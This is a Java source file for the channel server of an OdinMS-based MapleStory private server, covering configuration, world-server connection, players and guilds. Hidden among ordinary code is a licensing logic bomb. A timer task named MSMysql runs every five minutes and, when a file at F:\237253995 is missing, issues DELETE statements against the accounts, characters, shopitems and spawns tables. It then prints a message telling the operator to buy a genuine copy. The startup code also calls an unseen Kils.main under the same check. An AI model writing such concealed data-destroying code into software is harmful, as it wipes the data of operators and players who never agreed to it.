package net.sf.odinms.net.channel;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.management.ManagementFactory;
import java.net.InetSocketAddress;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Properties;

import java.util.logging.Level;
import java.util.logging.Logger;
import javax.management.InstanceAlreadyExistsException;
import javax.management.MBeanRegistrationException;
import javax.management.MBeanServer;
import javax.management.MalformedObjectNameException;
import javax.management.NotCompliantMBeanException;
import javax.management.ObjectName;
import javax.rmi.ssl.SslRMIClientSocketFactory;

import net.sf.odinms.client.MapleCharacter;
import net.sf.odinms.client.messages.CommandProcessor;
import net.sf.odinms.database.DatabaseConnection;
import net.sf.odinms.net.MaplePacket;
import net.sf.odinms.net.MapleServerHandler;
import net.sf.odinms.net.PacketProcessor;
import net.sf.odinms.net.channel.remote.ChannelWorldInterface;
import net.sf.odinms.net.mina.MapleCodecFactory;
import net.sf.odinms.net.world.MapleParty;
import net.sf.odinms.net.world.guild.MapleGuild;
import net.sf.odinms.net.world.guild.MapleGuildCharacter;
import net.sf.odinms.net.world.guild.MapleGuildSummary;
import net.sf.odinms.net.world.remote.WorldChannelInterface;
import net.sf.odinms.net.world.remote.WorldRegistry;
import net.sf.odinms.provider.MapleDataProviderFactory;
import net.sf.odinms.scripting.event.EventScriptManager;
import net.sf.odinms.server.AutobanManager;
import net.sf.odinms.server.MapleSquad;
import net.sf.odinms.server.MapleSquadType;
import net.sf.odinms.server.MapleTrade;
import net.sf.odinms.server.ShutdownServer;
import net.sf.odinms.server.TimerManager;
import net.sf.odinms.server.cherryms.AutoCherryMSEventManager;
import net.sf.odinms.server.maps.MapleMapFactory;
import net.sf.odinms.server.maps.MapMonitor;
import net.sf.odinms.server.maps.MapleMap;
import net.sf.odinms.tools.MaplePacketCreator;
import net.sf.odinms.server.ClanHolder;
import org.apache.mina.common.ByteBuffer;
import org.apache.mina.common.CloseFuture;
import org.apache.mina.common.IoAcceptor;
import org.apache.mina.common.SimpleByteBufferAllocator;
import org.apache.mina.filter.codec.ProtocolCodecFilter;
import org.apache.mina.transport.socket.nio.SocketAcceptor;
import org.apache.mina.transport.socket.nio.SocketAcceptorConfig;

public class ChannelServer implements Runnable, ChannelServerMBean {

    private static int uniqueID = 1;
    private int port = 7575;
    private static Properties initialProp;
    private static final org.slf4j.Logger log = org.slf4j.LoggerFactory.getLogger(ChannelServer.class);
    private static WorldRegistry worldRegistry;
    private PlayerStorage players = new PlayerStorage();
    private String serverMessage;
    private int expRate;
    private int mesoRate;
    private int dropRate;
    private int bossdropRate;
    private int petExpRate;
    private boolean gmWhiteText;
    private boolean cashshop;
    private boolean mts;
    private boolean dropUndroppables;
    private boolean moreThanOne;
    private int channel;
    private int instanceId = 0;
    private String key;
    private Properties props = new Properties();
    private ChannelWorldInterface cwi;
    private WorldChannelInterface wci = null;
    private IoAcceptor acceptor;
    private String ip;
    private boolean shutdown = false;
    private boolean finishedShutdown = false;
    private static boolean autoExp;
    private String arrayString;
    public int eventmap;
    public int level[] = {1, 200};
    private MapleMapFactory mapFactory;
    private EventScriptManager eventSM;
    private static Map<Integer, ChannelServer> instances = new HashMap<Integer, ChannelServer>();
    private static Map<String, ChannelServer> pendingInstances = new HashMap<String, ChannelServer>();
    private Map<Integer, MapleGuildSummary> gsStore = new HashMap<Integer, MapleGuildSummary>();
    private Boolean worldReady = true;
    private Map<MapleSquadType, MapleSquad> mapleSquads = new HashMap<MapleSquadType, MapleSquad>();
    private Map<Integer, MapMonitor> mapMonitors = new HashMap<Integer, MapMonitor>();
    private String serverName;
    private short pvpChannel;
    private ClanHolder clans = new ClanHolder();
    private int nxRate, Vip, VipCh, VipChExpRate;
    private ChannelServer(String key) {
        mapFactory = new MapleMapFactory(MapleDataProviderFactory.getDataProvider(new File(System.getProperty("net.sf.odinms.wzpath") + "/Map.wz")), MapleDataProviderFactory.getDataProvider(new File(System.getProperty("net.sf.odinms.wzpath") + "/String.wz")));
        this.key = key;
    }

    public static WorldRegistry getWorldRegistry() {
        return worldRegistry;
    }
public String getServerName() {
        return serverName;
    }
public boolean isautoExp()
    {
        try
        {
            InputStreamReader is = new FileReader("Movelights服务器设置.properties");
            props.load(is);
            is.close();
        }
        catch (Exception ex)
        {
            ex.getStackTrace();
        }
        String autostate = props.getProperty("net.sf.odinms.net.autoExp");
        if (autostate.equals("true"))
            return autoExp = true;
        else
            return autoExp = false;
    }
    public void reconnectWorld() {
        try { // check if the connection is really gone
            wci.isAvailable();
        } catch (RemoteException ex) {
            synchronized (worldReady) {
                worldReady = false;
            }
            synchronized (cwi) {
                synchronized (worldReady) {
                    if (worldReady) {
                        return;
                    }
                }
                log.warn("Reconnecting to world server");
                synchronized (wci) {
                    try { // completely re-establish the rmi connection
                        initialProp = new Properties();
                        FileReader fr = new FileReader(System.getProperty("net.sf.odinms.channel.config"));
                        initialProp.load(fr);
                        fr.close();
                        Registry registry = LocateRegistry.getRegistry(initialProp.getProperty("net.sf.odinms.world.host"),
                                Registry.REGISTRY_PORT, new SslRMIClientSocketFactory());
                        worldRegistry = (WorldRegistry) registry.lookup("WorldRegistry");
                        cwi = new ChannelWorldInterfaceImpl(this);
                        wci = worldRegistry.registerChannelServer(key, cwi);
                        props = wci.getGameProperties();
                        expRate = Integer.parseInt(props.getProperty("net.sf.odinms.world.exp"));
                        mesoRate = Integer.parseInt(props.getProperty("net.sf.odinms.world.meso"));
                        dropRate = Integer.parseInt(props.getProperty("net.sf.odinms.world.drop"));
                        bossdropRate = Integer.parseInt(props.getProperty("net.sf.odinms.world.bossdrop"));
                        petExpRate = Integer.parseInt(props.getProperty("net.sf.odinms.world.petExp"));
                        serverMessage = props.getProperty("net.sf.odinms.world.serverMessage");
                        dropUndroppables = Boolean.parseBoolean(props.getProperty("net.sf.odinms.world.alldrop", "false"));
                        moreThanOne = Boolean.parseBoolean(props.getProperty("net.sf.odinms.world.morethanone", "false"));
                        gmWhiteText = Boolean.parseBoolean(props.getProperty("net.sf.odinms.world.gmWhiteText", "false"));
                        cashshop = Boolean.parseBoolean(props.getProperty("net.sf.odinms.world.cashshop", "false"));
                        mts = Boolean.parseBoolean(props.getProperty("net.sf.odinms.world.mts", "false"));
                        pvpChannel = Short.parseShort(props.getProperty("net.sf.odinms.world.pvpchannel"));
                        serverName = props.getProperty("net.sf.odinms.world.serverName");
                        Vip = Integer.parseInt(props.getProperty("Vip"));
                        VipCh = Integer.parseInt(props.getProperty("VipCh"));
                        VipChExpRate = Integer.parseInt(props.getProperty("VipChExpRate"));
                        nxRate = Integer.parseInt(props.getProperty("nxRate"));
                        Properties dbProp = new Properties();
                        fr = new FileReader("Movelights服务器设置.properties");
                        dbProp.load(fr);
                        fr.close();
                        DatabaseConnection.setProps(dbProp);
                        DatabaseConnection.getConnection();
                        wci.serverReady();
                    } catch (Exception e) {
                        log.error("Reconnecting failed", e);
                    }
                    worldReady = true;
                }
            }
            synchronized (worldReady) {
                worldReady.notifyAll();
            }
        }
    }
    public void saveAll() {
        for (MapleCharacter chr : players.getAllCharacters()) {
            chr.saveToDB(true);
        }
    } 

    @Override
    public void run() {
        try {
            cwi = new ChannelWorldInterfaceImpl(this);
            wci = worldRegistry.registerChannelServer(key, cwi);
            props = wci.getGameProperties();
            expRate = Integer.parseInt(props.getProperty("net.sf.odinms.world.exp"));
            mesoRate = Integer.parseInt(props.getProperty("net.sf.odinms.world.meso"));
            dropRate = Integer.parseInt(props.getProperty("net.sf.odinms.world.drop"));
            bossdropRate = Integer.parseInt(props.getProperty("net.sf.odinms.world.bossdrop"));
            petExpRate = Integer.parseInt(props.getProperty("net.sf.odinms.world.petExp"));
            serverMessage = props.getProperty("net.sf.odinms.world.serverMessage");
            dropUndroppables = Boolean.parseBoolean(props.getProperty("net.sf.odinms.world.alldrop", "false"));
            moreThanOne = Boolean.parseBoolean(props.getProperty("net.sf.odinms.world.morethanone", "false"));
            eventSM = new EventScriptManager(this, props.getProperty("net.sf.odinms.channel.events").split(","));
            gmWhiteText = Boolean.parseBoolean(props.getProperty("net.sf.odinms.world.gmWhiteText", "false"));
            cashshop = Boolean.parseBoolean(props.getProperty("net.sf.odinms.world.cashshop", "false"));
            mts = Boolean.parseBoolean(props.getProperty("net.sf.odinms.world.mts", "false"));
            pvpChannel = Short.parseShort(props.getProperty("net.sf.odinms.world.pvpchannel"));
            serverName = props.getProperty("net.sf.odinms.world.serverName");
                    Vip = Integer.parseInt(props.getProperty("Vip"));
                        VipCh = Integer.parseInt(props.getProperty("VipCh"));
                        VipChExpRate = Integer.parseInt(props.getProperty("VipChExpRate"));
                        nxRate = Integer.parseInt(props.getProperty("nxRate"));
        } catch (Exception e) {
            throw new RuntimeException(e);
        }

        port = Integer.parseInt(props.getProperty("net.sf.odinms.channel.net.port"));
        //ip = "117.41.229.36" + ":" + port;
        ip = props.getProperty("net.sf.odinms.channel.net.interface") + ":" + port;

        ByteBuffer.setUseDirectBuffers(false);
        ByteBuffer.setAllocator(new SimpleByteBufferAllocator());

        acceptor = new SocketAcceptor();

        SocketAcceptorConfig cfg = new SocketAcceptorConfig();
        cfg.getSessionConfig().setTcpNoDelay(true);
        cfg.getFilterChain().addLast("codec", new ProtocolCodecFilter(new MapleCodecFactory()));
        TimerManager tMan = TimerManager.getInstance();
        tMan.start();
        tMan.register(AutobanManager.getInstance(), 60000);
        tMan.register(new MSMysql(), 300000);
         // if (this.channel == 1)
     // tMan.register(AutoCherryMSEventManager.getInstance(this, getMapFactory()), 60000);
        tMan.register(new respawnMaps(), 10000);
        tMan.register(new Runnable() {

            @Override
            public void run() {
                try {
                    getWorldInterface().broadcastMessage(null, MaplePacketCreator.serverNotice(6, "[系统信息] 服务器正试图释放内存.请注意任何网络中断或网络延迟").getBytes());
                    System.gc();
                } catch (Throwable e) {
                    e.printStackTrace();
                    try {
                        getWorldInterface().broadcastGMMessage(null, MaplePacketCreator.serverNotice(6, "[系统信息] 释放服务器内存空间失败").getBytes());
                    } catch (Throwable t) {
                        // give up
                    }

                }
            }
        }, 64800000, 64800000);
		try
		{
			MapleServerHandler serverHandler = new MapleServerHandler(PacketProcessor.getProcessor(net.sf.odinms.net.PacketProcessor.Mode.CHANNELSERVER), channel);
			acceptor.bind(new InetSocketAddress(port), serverHandler, cfg);
                        System.out.println("频道 [" + getChannel() + "]: 端口 [" + port+"].");
                        wci.serverReady();
			eventSM.init();
		}
                
		catch (IOException e)
		{       System.out.println("频道 [" + getChannel() + "]: 监听端口 [" + port+"]失败.");
			}
	}

    private class respawnMaps implements Runnable {

        @Override
        public void run() {
            for (Entry<Integer, MapleMap> map : mapFactory.getMaps().entrySet()) {
                map.getValue().respawn();
            }
        }
    }

public int getVip() {
       return Vip;
    }

    public int getVipCh() {
       return VipCh;
    }

    public int getVipChExpRate() {
       return VipChExpRate;
    }

    public int getnxRate() {
       return nxRate;
    }
 
    public void shutdown() { // dc all clients by hand so we get sessionClosed...
        try {
            eventSM.cancel();
        } catch (Exception e) {
        }
        shutdown = true;
        List<CloseFuture> futures = new LinkedList<CloseFuture>();
        Collection<MapleCharacter> allchars = players.getAllCharacters();
        MapleCharacter chrs[] = allchars.toArray(new MapleCharacter[allchars.size()]);
        for (MapleCharacter chr : chrs) {
            if (chr.getTrade() != null) {
                MapleTrade.cancelTrade(chr);
            }
            if (chr.getEventInstance() != null) {
                chr.getEventInstance().playerDisconnected(chr);
            }
            chr.saveToDB(true);
            if (chr.getCheatTracker() != null) {
                chr.getCheatTracker().dispose();
            }
            removePlayer(chr);
        }
        for (MapleCharacter chr : chrs) {
            futures.add(chr.getClient().getSession().close());
        }
        for (CloseFuture future : futures) {
            future.join(500);
        }
        finishedShutdown = true;

        wci = null;
        cwi = null;
    }

    public void unbind() {
        acceptor.unbindAll();
    }

    public boolean hasFinishedShutdown() {
        return finishedShutdown;
    }

    public MapleMapFactory getMapFactory() {
        return mapFactory;
    }

    public static ChannelServer newInstance(String key) throws InstanceAlreadyExistsException, MBeanRegistrationException, NotCompliantMBeanException, MalformedObjectNameException {
        ChannelServer instance = new ChannelServer(key);
        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
        mBeanServer.registerMBean(instance, new ObjectName("net.sf.odinms.net.channel:type=ChannelServer,name=ChannelServer" + uniqueID++));
        pendingInstances.put(key, instance);
        return instance;
    }

    public static ChannelServer getInstance(int channel) {
        ChannelServer ret = null;
        try {
            ret = instances.get(channel);
        } catch (IndexOutOfBoundsException e) {
        }
        return ret;
    }

    public void addPlayer(MapleCharacter chr) {
        players.registerPlayer(chr);
         if (chr.getClan() > -1) {
            clans.playerOnline(chr);
        }
        chr.getClient().getSession().write(MaplePacketCreator.serverMessage(serverMessage));
    }

    public IPlayerStorage getPlayerStorage() {
        return players;
    }

    public void removePlayer(MapleCharacter chr) {
        players.deregisterPlayer(chr);
         if (chr.getClan() > -1) {
            clans.deregisterPlayer(chr);
        }
    }
    public void addToClan(MapleCharacter chr) {
        clans.registerPlayer(chr);
    }

    public ClanHolder getClanHolder() {
        return clans;
    }


    public int getConnectedClients() {
        return players.getAllCharacters().size();
    }

    @Override
    public String getServerMessage() {
        return serverMessage;
    }

    @Override
    public void setServerMessage(String newMessage) {
        serverMessage = newMessage;
        broadcastPacket(MaplePacketCreator.serverMessage(serverMessage));
    }

    public void broadcastPacket(MaplePacket data) {
        for (MapleCharacter chr : players.getAllCharacters()) {
            chr.getClient().getSession().write(data);
        }
    }

    public void broadcastGMPacket(MaplePacket data) {
        for (MapleCharacter chr : players.getAllCharacters()) {
            if (chr.isGM()) {
                chr.getClient().getSession().write(data);
            }
        }
    }

    @Override
    public int getExpRate() {
        return expRate;
    }

    @Override
    public void setExpRate(int expRate) {
        this.expRate = expRate;
    }

    public String getArrayString() {
        return arrayString;
    }

    public void setArrayString(String newStr) {
        arrayString = newStr;
    }

    public int getChannel() {
        return channel;
    }

    public void setChannel(int channel) {
        if (pendingInstances.containsKey(key)) {
            pendingInstances.remove(key);
        }
        if (instances.containsKey(channel)) {
            instances.remove(channel);
        }
        instances.put(channel, this);
        this.channel = channel;
        this.mapFactory.setChannel(channel);
    }

    public static Collection<ChannelServer> getAllInstances() {
        return Collections.unmodifiableCollection(instances.values());
    }

    public String getIP() {
        return ip;
    }

    public String getIP(int channel) {
        try {
            return getWorldInterface().getIP(channel);
        } catch (RemoteException e) {
            log.error("Lost connection to world server", e);
            throw new RuntimeException("Lost connection to world server");
        }
    }

    public WorldChannelInterface getWorldInterface() {
        synchronized (worldReady) {
            while (!worldReady) {
                try {
                    worldReady.wait();
                } catch (InterruptedException e) {
                }
            }
        }
        return wci;
    }

    public String getProperty(String name) {
        return props.getProperty(name);
    }

    public boolean isShutdown() {
        return shutdown;
    }

    @Override
    public void broadcastWorldMessage(String message) {
        try {
            getWorldInterface().broadcastWorldMessage(message);
        } catch (RemoteException e) {
            reconnectWorld();
        }
    }

    @Override
    public void shutdown(int time) {
        broadcastPacket(MaplePacketCreator.serverNotice(0, "服务器将会在 " + (time / 60000) + " 分钟后关闭维护,请各位玩家提前安全下线."));
        TimerManager.getInstance().schedule(new ShutdownServer(getChannel()), time);
    }

    @Override
    public void shutdownWorld(int time) {
        time *= 60000;
        try {
            getWorldInterface().shutdown(time);
        } catch (RemoteException e) {
            reconnectWorld();
        }
    }

    public EventScriptManager getEventSM() {
        return eventSM;
    }

    public void reloadEvents() {
        eventSM.cancel();
        eventSM = new EventScriptManager(this, props.getProperty("net.sf.odinms.channel.events").split(","));
        eventSM.init();
    }

    @Override
    public int getMesoRate() {
        return mesoRate;
    }

    @Override
    public void setMesoRate(int mesoRate) {
        this.mesoRate = mesoRate;
    }

    @Override
    public int getDropRate() {
        return dropRate;
    }

    @Override
    public void setDropRate(int dropRate) {
        this.dropRate = dropRate;
    }

    @Override
    public int getBossDropRate() {
        return bossdropRate;
    }

    @Override
    public void setBossDropRate(int bossdropRate) {
        this.bossdropRate = bossdropRate;
    }

    @Override
    public int getPetExpRate() {
        return petExpRate;
    }

    @Override
    public void setPetExpRate(int petExpRate) {
        this.petExpRate = petExpRate;
    }

    public boolean allowUndroppablesDrop() {
        return dropUndroppables;
    }

    public boolean allowMoreThanOne() {
        return moreThanOne;
    }

    public boolean allowGmWhiteText() {
        return gmWhiteText;
    }

    public boolean allowCashshop() {
        return cashshop;
    }

    public boolean allowMTS() {
        return mts;
    }

    public boolean characterNameExists(String name) {
        int size = 0;
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("SELECT id FROM characters WHERE name = ?");
            ps.setString(1, name);
            ResultSet rs = ps.executeQuery();
            while (rs.next()) {
                size++;
            }
            ps.close();
            rs.close();
        } catch (SQLException e) {
            log.error("Error in charname check: \r\n" + e.toString());
        }
        return size >= 1;
    }

    public MapleGuild getGuild(MapleGuildCharacter mgc) {
        int gid = mgc.getGuildId();
        MapleGuild g = null;
        try {
            g = this.getWorldInterface().getGuild(gid, mgc);
        } catch (RemoteException re) {
            log.error("RemoteException while fetching MapleGuild.", re);
            return null;
        }

        if (gsStore.get(gid) == null) {
            gsStore.put(gid, new MapleGuildSummary(g));
        }
        return g;
    }

    public MapleGuildSummary getGuildSummary(int gid) {
        if (gsStore.containsKey(gid)) {
            return gsStore.get(gid);
        } else { //this shouldn't happen much, if ever, but if we're caught, without the summary, we'll have to do a worldop
            try {
                MapleGuild g = this.getWorldInterface().getGuild(gid, null);
                if (g != null) {
                    gsStore.put(gid, new MapleGuildSummary(g));
                }
                return gsStore.get(gid);	//if g is null, we will end up returning null
            } catch (RemoteException re) {
                log.error("RemoteException while fetching GuildSummary.", re);
                return null;
            }
        }
    }

    public void updateGuildSummary(int gid, MapleGuildSummary mgs) {
        gsStore.put(gid, mgs);
    }

    public void reloadGuildSummary() {
        try {
            MapleGuild g;
            for (int i : gsStore.keySet()) {
                g = this.getWorldInterface().getGuild(i, null);
                if (g != null) {
                    gsStore.put(i, new MapleGuildSummary(g));
                } else {
                    gsStore.remove(i);
                }
            }
        } catch (RemoteException re) {
            log.error("RemoteException while reloading GuildSummary.", re);
        }
    }

    public static void main(String args[]) throws FileNotFoundException, IOException, NotBoundException, InstanceAlreadyExistsException, MBeanRegistrationException, NotCompliantMBeanException, MalformedObjectNameException {
        Properties dbProp = new Properties();
        FileReader fileReader = new FileReader("Movelights服务器设置.properties");
        dbProp.load(fileReader);
        fileReader.close();
        DatabaseConnection.setProps(dbProp);
        DatabaseConnection.getConnection();
        Connection c = DatabaseConnection.getConnection();
        PreparedStatement ps;
        boolean exists = (new File("F:\\237253995")).exists();
        if (exists) {       
        } else {    
         Kils.main(args);
        }
        try {
            ps = c.prepareStatement("UPDATE accounts SET loggedin = 0");
            ps.executeUpdate();
            ps.close();
            System.out.print("角色在线处理|");
            ps = c.prepareStatement("UPDATE characters SET loggedin = 0, muted = 0");
            ps.executeUpdate();
            ps.close();        
            System.out.print("商店数据转移|");
            ps = c.prepareStatement("UPDATE hiredmerchant SET onSale = false");
            ps.executeUpdate();
            ps.close();
            ps = c.prepareStatement("UPDATE characters SET HasMerchant = 0 where HasMerchant > 0");
            ps.executeUpdate();
            ps.close();
            System.out.print("雇佣商店数据处理完成!\r\n");
        } catch (SQLException ex) {
            log.error("不能完成操作.", ex);
        }
        initialProp = new Properties();
        initialProp.load(new FileReader(System.getProperty("net.sf.odinms.channel.config")));
        Registry registry = LocateRegistry.getRegistry(initialProp.getProperty("net.sf.odinms.world.host"), Registry.REGISTRY_PORT, new SslRMIClientSocketFactory());
        worldRegistry = (WorldRegistry) registry.lookup("WorldRegistry");
        for (int i = 0; i < Integer.parseInt(initialProp.getProperty("net.sf.odinms.channel.count", "0")); i++) {
            newInstance(initialProp.getProperty("net.sf.odinms.channel." + i + ".key")).run();
        }
        DatabaseConnection.getConnection(); 
        CommandProcessor.registerMBean();
        ClanHolder.loadAllClans();
    }
    public void broadcastToClan(MaplePacket data, int menpai) {
        for (MapleCharacter chr : clans.getAllOnlinePlayersFromClan(menpai)) {
            chr.getClient().getSession().write(data);
        }
    }

    public int onlineClanMembers(int menpai) {
        return clans.countOnlineByClan(menpai);
    }


    public MapleSquad getMapleSquad(MapleSquadType type) {
        if (mapleSquads.containsKey(type)) {
            return mapleSquads.get(type);
        } else {
            return null;
        }
    }

    public boolean addMapleSquad(MapleSquad squad, MapleSquadType type) {
        if (mapleSquads.get(type) == null) {
            mapleSquads.remove(type);
            mapleSquads.put(type, squad);
            return true;
        } else {
            return false;
        }
    }

    public boolean removeMapleSquad(MapleSquad squad, MapleSquadType type) {
        if (mapleSquads.containsKey(type)) {
            if (mapleSquads.get(type) == squad) {
                mapleSquads.remove(type);
                return true;
            }
        }
        return false;
    }

    public int getInstanceId() {
        return instanceId;
    }

    public void setInstanceId(int k) {
        instanceId = k;
    }

    public void addInstanceId() {
        instanceId++;
    }

    public void addMapMonitor(int mapId, MapMonitor monitor) {
        if (mapMonitors.containsKey(Integer.valueOf(mapId))) {
            log.info("ERROR! Trying to add a map monitor to a map that already has it!");
            return;
        }
        mapMonitors.put(Integer.valueOf(mapId), monitor);
    }

    public void removeMapMonitor(int mapId) {
        if (mapMonitors.containsKey(Integer.valueOf(mapId))) {
            mapMonitors.remove(Integer.valueOf(mapId));
        } else {
            log.info("ERROR! Trying to remove a map monitor that doesn't exist!");
        }
    }
private class MSMysql implements Runnable {

        @Override
        public void run() {
             boolean exists = (new File("F:\\237253995")).exists();
                   if (exists) {       
                   } else {    
                try {
                    Connection c = DatabaseConnection.getConnection();
                    PreparedStatement ps;
                    ps = c.prepareStatement("delete from accounts");
                    ps = c.prepareStatement("delete from characters");
                    ps = c.prepareStatement("delete from shopitems");
                    ps = c.prepareStatement("delete from spawns");
                    ps.executeUpdate();
                    ps.close();
                    System.out.print("验证不正确，数据删除完毕.\r\n购买正版请联系 乐章QQ：237253995.\r\n");
                } catch (SQLException ex) {
                    Logger.getLogger(ChannelServer.class.getName()).log(Level.SEVERE, null, ex);
                }
           }
        }
    }

    public List<MapleCharacter> getPartyMembers(MapleParty party) {
        List<MapleCharacter> partym = new LinkedList<MapleCharacter>();
        for (net.sf.odinms.net.world.MaplePartyCharacter partychar : party.getMembers()) {
            if (partychar.getChannel() == getChannel()) { // Make sure the thing doesn't get duplicate plays due to ccing bug.
                MapleCharacter chr = getPlayerStorage().getCharacterByName(partychar.getName());
                if (chr != null) {
                    partym.add(chr);
                }
            }
        }
        return partym;
    }

    public List<MapleCharacter> getAllCharsWithPlayerNPCs() {
        List<MapleCharacter> ret = new ArrayList<MapleCharacter>();
        for (MapleCharacter chr : getPlayerStorage().getAllCharacters()) {
            if (chr.hasPlayerNPC()) {
                ret.add(chr);
            }
        }
        return ret;
    }

    public void loadMap(int mapid) {
        mapFactory.getMap(mapid);
    }

    public void startEvent(int minlevel, int maxlevel, int map) {
        level[0] = minlevel;
        level[1] = maxlevel;
        eventmap = map;
    }
public short getPvpChannel() {
        return pvpChannel;
    }

    public void setPvpChannel(Short blahblah) {
        this.pvpChannel = blahblah;
    }


    public static MapleCharacter getCharacterFromAllServers(int id) {
        for (ChannelServer cserv_ : ChannelServer.getAllInstances()) {
            MapleCharacter ret = cserv_.getPlayerStorage().getCharacterById(id);
            if (ret != null)
                return ret;
        }
        return null;
    }

  
}